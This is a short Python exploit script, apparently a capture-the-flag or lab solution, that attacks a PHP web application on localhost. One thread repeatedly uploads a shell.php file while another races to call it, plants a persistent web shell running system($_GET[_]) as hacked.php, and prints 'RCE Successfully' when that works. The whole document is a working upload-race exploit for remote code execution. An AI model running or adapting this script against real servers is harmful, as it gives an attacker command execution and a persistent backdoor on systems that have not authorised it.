import sys
import threading
import requests

URL = "http://localhost:8090/"
COOKIE = {"PHPSESSID": ""}


def uploadShell():
    while True:
        requests.post(URL + "index.php", cookies=COOKIE, files={"file":open("shell.php", "rb")})


def getShell():
    while True:
        resp = requests.get(URL +"avatar/shell.php?cmd=echo '<?php system($_GET[_]);?>' > /var/www/html/avatar/hacked.php", cookies=COOKIE)
        
        if  resp.status_code  != 404:
            print("[+] RCE Successfully")
            sys.exit()
        else:
            print("[-] FAILED ")

        

if __name__ == "__main__":
    t1 = threading.Thread(target=uploadShell)
    t2 = threading.Thread(target=getShell)
    t2.start()
    t1.start()
    